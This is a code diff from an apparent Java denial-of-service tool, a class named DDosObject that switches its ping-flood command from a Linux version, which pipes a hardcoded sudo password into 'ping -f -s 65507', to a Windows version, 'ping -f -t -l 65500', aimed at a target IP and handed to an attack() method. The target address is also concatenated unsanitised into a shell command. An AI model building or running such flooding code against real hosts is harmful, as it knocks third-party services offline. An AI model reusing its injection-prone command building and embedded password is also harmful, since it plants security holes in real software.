@@ -39,7 +39,7 @@ public class DDosObject {
                     Java implementation of ping does not allow for altering of packet size / flooding, so we use bash
                      */
                 String ipAddress = dDosObject.getIpAddress();
-                String[] cmd = {"/bin/bash", "-c", "echo testPass| sudo -S ping " + ipAddress + " -f -s 65507"};
+                //String[] cmd = {"/bin/bash", "-c", "echo testPass| sudo -S ping " + ipAddress + " -f -s 65507"};
                 System.out.println(" Pinging " +ipAddress);
 
                     /*Equivalent ping command for Windows
@@ -47,7 +47,7 @@ public class DDosObject {
                     -l sets the buffer size
                     -f continuously sends pings without waiting for a reply
                      */
-                //String[] cmd = {"ping " + ipAddress + " -f -t -l 65500"};
+                String[] cmd = {"ping " + ipAddress + " -f -t -l 65500"};
                 attack(cmd);
             } catch (Exception e) {
             }
